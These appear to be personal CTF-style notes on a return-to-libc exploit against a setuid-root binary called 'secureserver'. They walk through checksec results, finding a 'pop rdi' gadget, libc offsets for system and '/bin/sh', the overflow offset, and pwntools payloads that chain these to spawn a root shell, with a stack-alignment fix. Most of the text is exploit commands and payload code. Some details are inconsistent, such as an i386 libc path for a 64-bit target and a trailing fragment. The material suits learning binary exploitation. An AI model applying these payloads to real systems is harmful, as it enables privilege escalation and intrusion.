Return to libc

$ sudo chmod 600 flag.txt 
$ sudo chmod 4655 secureserver
$ sudo chown root:root secureserver
$ sudo chown root:root flag.txt 

secureserver: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f890ad80b62339e815e93e095690235d1466bfbb, for GNU/Linux 3.2.0, not stripped

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


NX enabled so we cannot run shellcode

********
Dynamically lined which is important coz we will we returning to libc library to execute functions there

We will need to find rdi and rsi registers

# ropper --file secureserver --search "pop rdi"
0x000000000040120b: pop rdi; ret;

when system functions is going to get called, it is going to look into rdi for address of /bin/sh string

32 bit will look in stack and 64 bit will look in these registers

1) ldd secureserver : 0x00007fcb8c217000
2) readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system : 000000000004c920  : this is the offset from base address of libc
3) strings /lib/i386-linux-gnu/libc.so.6 -a -t x | grep "/bin/sh"  : 19604f  : again , this is the offset

#cyclic 100
#cyclic -l jaaaaaaa
Found at offset 72

***********

before finding base address of libc, turn aslr off using
# aslr_off
also check address of system and /bin/sh since we are using 64 bit libc here
Procedure
1) payload will be
Padding + pop rdi gadget + binsh + system function address

Address provided afterbinsh will be popped into rdi

In 64 bit, we first put values in registers the call functions
in 32, we call function, then its return address, then pass params to function

payload = flat(
    asm('nop') * padding,  # padding before EIP
    pop_rdi, # pop the following address into rdi register
    binsh, #address of /bin/sh in libc
    system #address of system function in libc
)

************

#A small issue you may get when pwning on 64-bit systems is that your exploit works perfectly locally but fails remotely - or even fails when you try to use the provided LIBC version rather than your local one. This arises due to something called stack alignment

#if the stack is not 16-byte aligned - that is, RSP is not a multiple of 16 - the ROP chain will fail on systems

#The fix is simple - in your ROP chain, before the call to system, place a singular ret gadget
example payload : payload = flat(
	asm('nop') * padding,
	ret,
	pop_rdi,
	param1,
	pop_rsi,
	param2,
	junk,
    elf.symbols.hacked,
):will
